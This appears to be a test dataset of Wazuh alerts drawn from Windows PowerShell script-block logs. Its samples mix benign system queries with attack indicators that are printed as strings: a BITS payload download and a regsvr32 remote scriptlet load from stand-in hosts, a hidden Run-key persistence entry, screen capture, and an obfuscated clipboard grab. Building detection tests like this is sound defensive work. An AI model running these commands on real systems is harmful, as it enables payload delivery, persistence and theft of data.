{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8ea0bcee-8d6b-4c9b-877c-2c8fac05ad12","scriptBlockText":"$sampleId='PST-108'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722207","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-108'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8ea0bcee-8d6b-4c9b-877c-2c8fac05ad12\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:14.7735322Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:14.7735322Z\",\"eventRecordID\":\"722207\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-108'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8ea0bcee-8d6b-4c9b-877c-2c8fac05ad12\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-108'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8ea0bcee-8d6b-4c9b-877c-2c8fac05ad12\"}}}","id":"1784280975.467769","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:15.767+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"00d0982d-a8b5-4d2b-b8fa-44bb1702c23f","scriptBlockText":"$sampleId='PST-109'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722232","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-109'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 00d0982d-a8b5-4d2b-b8fa-44bb1702c23f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:15.1631432Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:15.1631432Z\",\"eventRecordID\":\"722232\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-109'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 00d0982d-a8b5-4d2b-b8fa-44bb1702c23f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-109'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"00d0982d-a8b5-4d2b-b8fa-44bb1702c23f\"}}}","id":"1784280975.467769","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:15.931+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f72fd631-62aa-4aca-9c1e-0ce1a9780920","scriptBlockText":"$sampleId='PST-110'; $indicator='STaRT-bITStrANSFER -sOurce ''htTPS://BiTS.ExaMpLE.InvaLiD/pAylOAD.BiN'' -DeSTiNAtiON ''$env:TeMp\\\\caChe.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722234","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-110'; $indicator='STaRT-bITStrANSFER -sOurce ''htTPS://BiTS.ExaMpLE.InvaLiD/pAylOAD.BiN'' -DeSTiNAtiON ''$env:TeMp\\caChe.bin'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f72fd631-62aa-4aca-9c1e-0ce1a9780920\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:15.5068885Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:15.5068885Z\",\"eventRecordID\":\"722234\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-110'; $indicator='STaRT-bITStrANSFER -sOurce ''htTPS://BiTS.ExaMpLE.InvaLiD/pAylOAD.BiN'' -DeSTiNAtiON ''$env:TeMp\\\\caChe.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f72fd631-62aa-4aca-9c1e-0ce1a9780920\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-110'; $indicator='STaRT-bITStrANSFER -sOurce ''htTPS://BiTS.ExaMpLE.InvaLiD/pAylOAD.BiN'' -DeSTiNAtiON ''$env:TeMp\\\\\\\\caChe.bin'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f72fd631-62aa-4aca-9c1e-0ce1a9780920\"}}}","id":"1784280975.472144","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":14,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:15.960+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5d3663db-b63e-4bfd-88ad-280735821991","scriptBlockText":"$sampleId='PST-111'; $indicator='REGsvr32.exE /s /N /U /I:HttpS://ReG.ExAmpLe.inVAliD/A.sCt sCrobj.dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722237","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-111'; $indicator='REGsvr32.exE /s /N /U /I:HttpS://ReG.ExAmpLe.inVAliD/A.sCt sCrobj.dll'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5d3663db-b63e-4bfd-88ad-280735821991\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:15.8672246Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:15.8672246Z\",\"eventRecordID\":\"722237\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-111'; $indicator='REGsvr32.exE /s /N /U /I:HttpS://ReG.ExAmpLe.inVAliD/A.sCt sCrobj.dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5d3663db-b63e-4bfd-88ad-280735821991\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-111'; $indicator='REGsvr32.exE /s /N /U /I:HttpS://ReG.ExAmpLe.inVAliD/A.sCt sCrobj.dll'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5d3663db-b63e-4bfd-88ad-280735821991\"}}}","id":"1784280976.472144","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:16.791+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d5a9cfed-489a-47df-9875-8e6cbb65e7f3","scriptBlockText":"$sampleId='PST-112'; $indicator='nEW-iTeMpROPerTy -PAtH ''HkcU:\\\\soFTwaRE\\\\MIcrOsofT\\\\wiNDows\\\\curRENTVersIoN\\\\rUn'' -naME ''upDAteChecK'' -VAlue ''powErsHelL.eXe -wINdOWsTYLe hiddEn -FiLE c:\\\\__ThEsIS_IneRT__\\\\sTaGE.PS1'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722241","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-112'; $indicator='nEW-iTeMpROPerTy -PAtH ''HkcU:\\soFTwaRE\\MIcrOsofT\\wiNDows\\curRENTVersIoN\\rUn'' -naME ''upDAteChecK'' -VAlue ''powErsHelL.eXe -wINdOWsTYLe hiddEn -FiLE c:\\__ThEsIS_IneRT__\\sTaGE.PS1'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d5a9cfed-489a-47df-9875-8e6cbb65e7f3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:16.2121035Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:16.2121035Z\",\"eventRecordID\":\"722241\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-112'; $indicator='nEW-iTeMpROPerTy -PAtH ''HkcU:\\\\soFTwaRE\\\\MIcrOsofT\\\\wiNDows\\\\curRENTVersIoN\\\\rUn'' -naME ''upDAteChecK'' -VAlue ''powErsHelL.eXe -wINdOWsTYLe hiddEn -FiLE c:\\\\__ThEsIS_IneRT__\\\\sTaGE.PS1'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d5a9cfed-489a-47df-9875-8e6cbb65e7f3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-112'; $indicator='nEW-iTeMpROPerTy -PAtH ''HkcU:\\\\\\\\soFTwaRE\\\\\\\\MIcrOsofT\\\\\\\\wiNDows\\\\\\\\curRENTVersIoN\\\\\\\\rUn'' -naME ''upDAteChecK'' -VAlue ''powErsHelL.eXe -wINdOWsTYLe hiddEn -FiLE c:\\\\\\\\__ThEsIS_IneRT__\\\\\\\\sTaGE.PS1'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d5a9cfed-489a-47df-9875-8e6cbb65e7f3\"}}}","id":"1784280976.474669","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Possible addition of new item to Windows startup registry","firedtimes":1,"groups":["windows"," powershell"],"id":"91844","level":12,"mail":true,"mitre":{"id":["T1547.001","T1059.001","T1112"],"tactic":["Persistence","Privilege Escalation","Execution","Defense Evasion"],"technique":["Registry Run Keys / Startup Folder","PowerShell","Modify Registry"]}},"timestamp":"2026-07-17T11:36:16.797+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"4371e8ae-bb5b-4300-9ddb-737bdddd4d02","scriptBlockText":"$sampleId='PST-113'; $indicator='[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722242","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-113'; $indicator='[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 4371e8ae-bb5b-4300-9ddb-737bdddd4d02\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:16.5517874Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:16.5517874Z\",\"eventRecordID\":\"722242\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-113'; $indicator='[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 4371e8ae-bb5b-4300-9ddb-737bdddd4d02\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-113'; $indicator='[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"4371e8ae-bb5b-4300-9ddb-737bdddd4d02\"}}}","id":"1784280976.477529","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Screen capture method invoked from PowerShell script.","firedtimes":2,"groups":["windows"," powershell"],"id":"91803","level":14,"mail":true,"mitre":{"id":["T1113"],"tactic":["Collection"],"technique":["Screen Capture"]}},"timestamp":"2026-07-17T11:36:16.799+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ce518e27-f1ba-46c7-b276-514b4ecbd3b2","scriptBlockText":"$sampleId='PST-114'; $parts=@('GEt-cLI','PB`OArD ','-rAw ','| Co','`nVE','rTTo-Js','on -CO`Mp','ReS','s'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722246","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-114'; $parts=@('GEt-cLI','PB`OArD ','-rAw ','| Co','`nVE','rTTo-Js','on -CO`Mp','ReS','s'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ce518e27-f1ba-46c7-b276-514b4ecbd3b2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:16.8921164Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:16.8921164Z\",\"eventRecordID\":\"722246\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-114'; $parts=@('GEt-cLI','PB`OArD ','-rAw ','| Co','`nVE','rTTo-Js','on -CO`Mp','ReS','s'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ce518e27-f1ba-46c7-b276-514b4ecbd3b2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-114'; $parts=@('GEt-cLI','PB`OArD ','-rAw ','| Co','`nVE','rTTo-Js','on -CO`Mp','ReS','s'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ce518e27-f1ba-46c7-b276-514b4ecbd3b2\"}}}","id":"1784280977.477529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:17.627+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fe48bdf8-2a54-4a39-a00c-1b5f689a117f","scriptBlockText":"$sampleId='PST-115'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722250","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-115'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fe48bdf8-2a54-4a39-a00c-1b5f689a117f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:17.2189993Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:17.2189993Z\",\"eventRecordID\":\"722250\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-115'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fe48bdf8-2a54-4a39-a00c-1b5f689a117f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-115'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fe48bdf8-2a54-4a39-a00c-1b5f689a117f\"}}}","id":"1784280977.477529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:17.634+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"742c99e0-cae1-4292-ab58-85761324f6b4","scriptBlockText":"$sampleId='PST-116'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722296","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-116'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 742c99e0-cae1-4292-ab58-85761324f6b4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:18.3594621Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:18.3594621Z\",\"eventRecordID\":\"722296\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-116'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 742c99e0-cae1-4292-ab58-85761324f6b4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-116'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"742c99e0-cae1-4292-ab58-85761324f6b4\"}}}","id":"1784280978.477529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:18.865+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3f3ee02a-fd51-4446-ad9f-d3cba8717bbc","scriptBlockText":"$sampleId='PST-117'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722427","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-117'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3f3ee02a-fd51-4446-ad9f-d3cba8717bbc\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:21.0455286Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:21.0455286Z\",\"eventRecordID\":\"722427\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-117'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3f3ee02a-fd51-4446-ad9f-d3cba8717bbc\\r\\nPath: 